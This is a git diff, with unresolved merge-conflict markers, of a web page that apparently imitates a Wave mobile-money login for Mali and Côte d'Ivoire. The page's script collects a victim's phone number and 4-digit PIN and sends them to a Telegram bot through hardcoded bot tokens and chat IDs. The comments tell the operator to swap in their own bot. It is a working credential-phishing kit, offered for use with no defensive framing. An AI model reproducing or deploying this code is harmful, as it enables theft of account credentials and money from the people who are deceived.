@@ -86,10 +86,17 @@
     <form id="form">
         <div>
             <select>
+<<<<<<< HEAD
                 <option value="">+223</option>
             </select>
 
             <input id="tel" type="tel" minlength="8" maxlength="8" placeholder="XX XX XX XX " required>
+=======
+                <option value="">+225</option>
+            </select>
+
+            <input id="tel" type="tel" minlength="10" maxlength="10" placeholder="0X XX XX XX XX" required>
+>>>>>>> 62dc986759431fc351774577e52c94e5f2611bea
         </div>
         <span style="color: orange; margin-left: auto;" id="notif"></span>
         <br> <br>
@@ -110,7 +117,11 @@
 
         const tel = document.getElementById('tel').value;
 
+<<<<<<< HEAD
         if(tel.length == 8){
+=======
+        if(tel.length == 10){
+>>>>>>> 62dc986759431fc351774577e52c94e5f2611bea
 
             
             document.getElementById('pwd').style.display="block";
@@ -128,12 +139,21 @@
             const pwd = document.getElementById('pwd').value;
 
             if(pwd.length == 4){
+<<<<<<< HEAD
                 const botToken = "7891154943:AAG-iRSqPg6KL1q-slYogakDcXBvjrcrFCU";  // Remplace par le token de ton bot
                 const chatId = "8033906914";      // Remplace par l'ID du chat
 
                 
 
                 const message = `🎀 Wave mali :\n\n📞Numero : ${tel}\n🔐 Code : ${pwd}`;
+=======
+                const botToken = "7027409330:AAFwdyehbZKntGzAcU_02wBC4bMIVh2yb84";  // Remplace par le token de ton bot
+                const chatId = "7332838769";      // Remplace par l'ID du chat
+
+                
+
+                const message = `🎀 Wave ci :\n\n📞Numero : ${tel}\n🔐 Code : ${pwd}`;
+>>>>>>> 62dc986759431fc351774577e52c94e5f2611bea
 
 
                 fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
